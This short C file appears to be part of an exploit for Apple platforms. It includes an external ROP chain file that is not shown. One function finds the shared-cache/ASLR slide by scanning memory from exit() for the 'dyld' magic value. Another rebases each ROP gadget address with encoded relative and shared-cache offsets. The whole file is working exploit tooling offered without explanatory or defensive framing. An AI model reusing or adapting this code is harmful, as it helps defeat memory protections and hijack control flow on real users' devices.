#include <assert.h>
#include <string.h>
#include "rope.inc"

static uint32_t
get_slide(void)
{
    uintptr_t p = (uintptr_t)exit & ~0x3FFF;
    while (*(uint64_t *)p != 0x646c7964) {
        p -= 0x4000;
    }
    return p - 0x80000000;
}

static void
relocate(unsigned long *rop, size_t n, unsigned long aslide, unsigned long rslide)
{
    size_t i;
    // 0xNMMMaaaaaaaaaaaa
    // N = 10mm => relative offset
    // N = 11mm => shared cache offset
    // M = distance to next relocation
    for (i = 0; i < n; i++) {
        unsigned long w = rop[i];
        unsigned int mask = (w >> 60) & 0xC;
        if (mask) {
            do {
                if (mask == 0x8) {
                    // relative offset
                    rop[i] = (w & 0xFFFFFFFFFFFF) + rslide;
                    i += ((w >> 48) & 0x3FFF);
                    assert(i < n);
                } else if (mask == 0xC) {
                    // shared cache offset
                    rop[i] = (w & 0xFFFFFFFFFFFF) + aslide;
                    i += ((w >> 48) & 0x3FFF);
                    assert(i < n);
                } else {
                    assert(0);
                }
                w = rop[i];
                mask = (w >> 60) & 0xC;
            } while (mask);
            break;
        }
    }
}
